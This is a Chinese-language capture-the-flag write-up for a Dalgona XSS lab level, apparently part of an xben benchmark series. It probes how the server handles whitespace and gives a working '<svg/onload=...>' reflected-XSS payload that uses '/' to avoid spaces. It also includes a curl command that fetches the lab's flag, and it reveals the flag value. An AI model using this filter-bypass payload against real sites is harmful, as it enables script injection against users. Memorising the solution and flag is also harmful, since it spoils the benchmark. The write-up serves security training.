## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场（三角图标，`Dalgona - Triangle`）。
入口 `Page` → `GET /page?name=...`，反射在文本节点：

```html
<input type=text name=name placeholder="Enter your name..." > INPUT>
```

### 关键观察

**1. 几乎不过滤标签，但"含空白就整段丢弃"。**

| 输入 | 反射 |
| --- | --- |
| `QabcQ` | `QabcQ` |
| `Q<Q` / `Q>Q` / `Q<svgQ` | 原样 |
| `QalertQ` / `QonloadQ` / `Q"XSS"Q` | 原样 |
| `ab` | `ab` |
| **`a b`** | **（空）** |
| **`a  b`** | **（空）** |
| `Qa bQ` | （空） |

即：**只要输入里出现空格（或其它空白），整条输入被丢弃**，而不是把空格删掉。

注意这与同族几关都不同：

| 关卡 | 空白处理 |
| --- | --- |
| xben-011-24 | 删除所有空白（`a b` → `ab`） |
| xben-012-24 | 保留空白 |
| xben-015-24 | 保留空白 |
| **本题** | **含空白即整段丢弃** |

**2. 正因为空白被禁，用 `/` 分隔属性的标签反而最省事。**

`<svg/onload=...>` 天然不需要空格。而依赖空格的写法（如
`<input autofocus onfocus=...>`、`<img src=x onerror=...>`）会因为含空格被整段丢弃。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=<svg/onload=alert("XSS")' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations!<p> Here is the flag: flag{30f58005-8332-4823-a7c2-00cbefe58e67}
```

带不带结尾 `>` 都可以（本关不删标签）：

```text
<svg/onload=alert("XSS")     通过
<svg/onload=alert("XSS")>    通过
```

### flag 位置

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **"整段丢弃"的触发条件可以是一个字符类。** 本题触发词是空白，
  013 的触发词是 `alert`/`confirm`。判据相同：反射为空、页面照常。
  所以看到"输入消失"时，先猜"命中了某个黑名单"，再去枚举是哪个。
- **空白被禁时，`/` 就是属性分隔符。** HTML5 允许 `<svg/onload=x>`，
  所以最省事的标签形态本来就不含空格。这也解释了为什么
  `<input autofocus onfocus=…>` 在这关必然失败——它需要两个空格。
- **"带不带 `>` 都行"说明标签没被过滤。** 与 011/015 的 `<[^>]+>` 完全不同：
  那两关必须不闭合，这关闭合也无所谓。**同一族里规则差异极大，必须逐关探测。**
- **一个探针就能定性。** `ab` 通过而 `a b` 被丢弃，只差一个空格，
  立刻确定"空白是触发词"，不需要再试别的字符类别。
